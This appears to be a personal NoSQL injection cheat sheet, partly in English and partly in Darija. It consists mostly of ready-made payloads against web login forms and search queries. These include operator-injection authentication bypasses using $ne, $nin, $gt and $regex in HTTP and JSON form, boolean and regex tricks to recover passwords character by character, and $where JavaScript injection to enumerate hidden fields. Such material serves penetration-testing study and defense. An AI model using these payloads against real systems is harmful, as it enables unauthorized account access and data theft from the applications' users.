user=admin&passwd=admin

``user[$ne]=blabla&passwd[$ne]=blabla            : the first user

- syntax Injection - This is similar to SQL injection, where we have the ability to break out of the query and inject our own payload. The key difference to SQL injection is the syntax used to perform the injection attack.

- Operator Injection —Even if we can't break out of the query, we could potentially inject a NoSQL query operator that manipulates the query's behaviour, allowing us to stage attacks such as authentication bypasses.

``user[$nin][]=admin&passwd[$ne]=admin    : hna ay wahd mn ghir admin , ida 3ndk w7do5er w7bit mykonch howa than : 

``user[$nin][]=admin&user[$nin][]=yahiapasswd[$ne]=admin 

``user=admin&pass[$regex]=^.{7}$          : 7 for test the length of the password ( check error and good)

afetr know the length of the password : we test the characters by : ^a....$

---
### Authentication bypass : 

### - HTTP data : 
``username[$ne]=toto&password[$ne]=toto
``login[$regex]=a.*&pass[$ne]=lol
``login[$gt]=admin&login[$lt]=test&pass[$ne]=1
``login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

### - JSON data : 
``{"username": {"$ne": null}, "password": {"$ne": null}}
``{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
``{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
``{"username": {"$gt":""}, "password": {"$gt":""}}
``{"$regex":"admin.*"}, "password": {"$ne":""}}``


## Serach query : 

return all the data ( always true ) : ``hello'||1||'


### Exploiting NoSQL injection to extract data (boolean) : 

==note== : url encode the payload .

user=yahia' : error
user=yahia'+' : no error 
user=yahia' && '1'='1 : no error
user=admin' && this.password.length < 30 || 'a'='b   : get the lengthe of the password
user=admin' && this.password[§0§]='§a§


### Exploiting NoSQL operator injection to extract unknown fields :

we will use ``$where`` to run javascript and inject it .
{ $where: <string|JavaScript Code> }

in javascript : 

let userInfo={
"name":"yahia",
"age":20
};
Object.keys(userInfo)[0] => name

use javascript in the $where to find the length of the hidden input > the name of hidden input > the length of the value of teh hidden input > the value of the hidden input ( boolean based )




---
resources : https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/